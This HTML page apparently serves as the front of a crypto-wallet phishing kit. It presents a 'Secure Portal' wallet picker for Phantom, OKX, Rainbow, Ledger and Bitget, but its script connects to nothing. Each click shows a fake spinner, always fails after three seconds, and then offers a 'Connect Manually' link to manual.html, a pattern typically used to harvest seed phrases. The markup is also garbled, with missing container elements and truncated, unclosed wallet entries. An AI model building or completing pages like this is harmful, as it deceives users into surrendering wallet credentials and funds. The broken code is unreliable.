<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connect Wallet | Secure Portal</title>
    <style>
        :root {
            --bg: #0f1217;
            --card-bg: #161b22;
            --item-bg: #21262d;
            --border: #30363d;
            --accent: #58a6ff;
            --text-main: #ffffff;
            --text-dim: #8b949e;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            background-color: var(--bg);
            color: var(--text-main);
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
            display: flex; justify-content: center; align-items: center; min-height: 100vh;
            padding: 20px;
        }

        .container { width: 100%; max-width: 480px; }

        .card {
            background: var(--card-bg);
            border: 1px solid var(--border);
            border-radius: 24px;
            padding: 30px;
            text-align: center;
            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
        }

        .logo-top { width: 50px; height: 50px; margin-bottom: 20px; border-radius: 12px; }
        
        h1 { font-size: 24px; font-weight: 700; margin-bottom: 8px; }
        h6 { color: var(--text-dim); font-size: 14px; margin-bottom: 30px; font-weight: 400; }

        .wallet-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 12px;
            max-height: 520px;
            overflow-y: auto;
            padding: 10px;
        }

        /* Scrollbar styling - Exactly like the sample */
        .wallet-grid::-webkit-scrollbar { width: 4px; }
        .wallet-grid::-webkit-scrollbar-thumb { background: var(--border); border-radius: 10px; }

        .wallet-item {
            background: var(--item-bg);
            border: 1px solid var(--border);
            border-radius: 16px;
            padding: 15px 5px;
            cursor: pointer;
            transition: all 0.2s ease;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .wallet-item:hover {
            border-color: var(--accent);
            background: #2d333b;
            transform: translateY(-3px);
        }

        .wallet-icon {
            width: 44px;
            height: 44px;
            object-fit: cover;
            margin-bottom: 10px;
            border-radius: 12px;
        }

        .wallet-name {
            font-size: 11px;
            font-weight: 600;
            color: var(--text-main);
            text-align: center;
        }

        /* Connecting Modal State */
        .modal-overlay {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.95);
            z-index: 1000;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            backdrop-filter: blur(10px);
        }

        .loader {
            width: 50px;
            height: 50px;
            border: 4px solid #30363d;
            border-top: 4px solid var(--accent);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .error-msg { color: #ff7b72; display: none; margin-top: 15px; font-size: 14px; }

        .btn-manual {
            display: none; margin-top: 20px; background: var(--accent);
            color: white; padding: 12px 24px; border-radius: 12px;
            text-decoration: none; font-weight: 600;
        }
    </style>
</head>
<body>

<div id="connectingModal" class="modal-overlay">
    <div id="spinner" class="loader"></div>
    <h2 id="modalTitle">Initializing Connection...</h2>
    <p id="errorTxt" class="error-msg">Unable to establish secure connection</p>
    <a href="manual.html" id="manualBtn" class="btn-manual">Connect Manually</a>
</div>

                <span class="wallet-name">Phantom</span>

            <div class="wallet-item" onclick="handleConnect('OKX')">

                <span class="wallet-name">OKX Wallet</span>
            </div>

            <div class="wallet-item" onclick="handleConnect('Rainbow')">
                <img src="https://explorer-api.walletconnect.com/w3m/v1/getAssetImage/1bf33a34-84c1-435b-e19c-723de7404200?projectId=c0563459e877fc5451676839a95728a3" class="wallet-icon">
                <span class="wallet-name">Rainbow</span>

            <div class="wallet-item" onclick="handleConnect('Ledger')">
                <img src="https://explorer-api.walletconnect.com/w3m/v1/getAssetImage/19177a98-2d2d-4876-b327-01d7ca2b4800?projectId=c0563459e877fc5451676839a95728a3" class="wallet-icon">

            <div class="wallet-item" onclick="handleConnect('Bitget')">
                <img src="https://explorer-api.walletconnect.com/w3m/v1/getAssetImage/33f97230-711f-447c-057d-77344836e000?projectId=c0563459e877fc5451676839a95728a3" class="wallet-icon">
                <span class="wallet-name">Bitget</span>
            </div>
        </div>
    </div>
</div>

<script>
    function handleConnect(name) {
        const modal = document.getElementById('connectingModal');
        const spinner = document.getElementById('spinner');
        const title = document.getElementById('modalTitle');
        const error = document.getElementById('errorTxt');
        const manualBtn = document.getElementById('manualBtn');

        modal.style.display = 'flex';
        title.innerText = "Connecting to " + name + "...";
        spinner.style.display = 'block';
        error.style.display = 'none';
        manualBtn.style.display = 'none';

        setTimeout(() => {
            spinner.style.display = 'none';
            title.innerText = "Connection Failed";
            error.style.display = 'block';
            manualBtn.style.display = 'block';
        }, 3000);
    }
</script>

</body>
</html>
